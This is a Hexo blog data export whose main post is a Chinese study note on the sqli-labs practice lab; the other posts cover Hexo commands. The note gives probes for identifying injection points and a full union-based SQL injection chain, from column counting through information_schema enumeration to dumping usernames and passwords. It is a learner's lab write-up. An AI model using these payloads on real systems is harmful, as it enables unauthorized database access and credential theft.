{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://wenjiayi.github.io/kaka.github.io","root":"/kaka.github.io/"},"pages":[],"posts":[{"title":"sql注入","slug":"sql注入","date":"2023-01-05T04:06:43.000Z","updated":"2023-04-20T08:26:28.144Z","comments":true,"path":"2023/01/05/sql注入/","link":"","permalink":"https://wenjiayi.github.io/kaka.github.io/2023/01/05/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"记录sqli-labssql注入点判断1.?id&#x3D;1 and 1&#x3D;1 和?id&#x3D;1 and 1&#x3D;2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。 2.?id&#x3D;1’ and 1&#x3D;1–+&#x2F;#和?id&#x3D;1’ and 1&#x3D;2–+&#x2F;#进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。 3.?id&#x3D;1’and 1&#x3D;1 and ‘1’&#x3D;’1和?id&#x3D;1’and 1&#x3D;1 and ‘1’&#x3D;’1进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。 4.?id&#x3D;1%’ and 1&#x3D;1 and ‘%’&#x3D;’%和?id&#x3D;1%’ and 1&#x3D;2 and ‘%’&#x3D;’%进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。 5.?id&#x3D;1%’ and 1&#x3D;1–+&#x2F;#和?id&#x3D;1%’ and 1&#x3D;2–+&#x2F;#进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。 SQL注入分类根据参数类型：字符型，数字型、搜索型 根据提交方式：POST注入，GET注入，HTTP HEAD注入 根据有无回显：联合注入，报错注入，布尔盲注，延时注入 其他注入：堆叠注入，宽字节注入，二次注入等 联合注入Less-11.1判断是否存在sql注入1.提示输入数字值的ID作为参数，输入?id&#x3D;1 2.通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。 3.接下来我们判断sql语句是否是拼接，且是字符型还是数字型。 4.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以可以使用联合查询。联合查询原理:联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。 2.2 联合注入1.首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。 1$ ?id=1&#x27;order by 3 --+ 2.爆出显示位，看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。 1$ ?id=-1&#x27;union select 1,2,3--+ 3.获取当前数据名和版本号 1$ ?id=-1&#x27;union select 1,database(),version()--+ 4.爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。 1$ ?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ 5.爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。（table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。） 1$ ?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 6.通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。 1$ ?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+ Less-2当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入 123456$ ?id=1 order by 3$ ?id=-1 union select 1,2,3$ ?id=-1 union select 1,database(),version()$ ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;$ ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;$ ?id=-1 union select 1,2,group_concat(username ,id , password) from users","categories":[],"tags":[]},{"title":"发博客","slug":"发博客","date":"2022-09-21T03:41:47.000Z","updated":"2022-09-21T05:58:51.672Z","comments":true,"path":"2022/09/21/发博客/","link":"","permalink":"https://wenjiayi.github.io/kaka.github.io/2022/09/21/%E5%8F%91%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"第一次使用，所以必须记录一下这些口令哈哈 口令1$ hexo g 完整命令为hexo generate,用于生成静态文件 1$ hexo s 完整命令为hexo server,用于启动服务器，主要用来本地预览 1$ hexo d 完整命令为hexo deploy,用于将本地文件发布到github等git仓库上 1$ hexo n “my article” 完整命令为hexo new,用于新建一篇名为“my article”的文章 1$ hexo clean 清除缓存文件 db.json 和已生成的静态文件 public。网站显示异常时可以执行这条命令试试。 预览 localhost:4000 可以预览效果","categories":[],"tags":[]},{"title":"咔的第一篇博客","slug":"My-New-Post","date":"2022-09-20T13:04:26.000Z","updated":"2022-09-21T04:35:19.281Z","comments":true,"path":"2022/09/20/My-New-Post/","link":"","permalink":"https://wenjiayi.github.io/kaka.github.io/2022/09/20/My-New-Post/","excerpt":"","text":"咔咔咔好辛苦哈哈","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2022-09-20T11:08:25.543Z","updated":"2022-09-20T11:08:25.543Z","comments":true,"path":"2022/09/20/hello-world/","link":"","permalink":"https://wenjiayi.github.io/kaka.github.io/2022/09/20/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}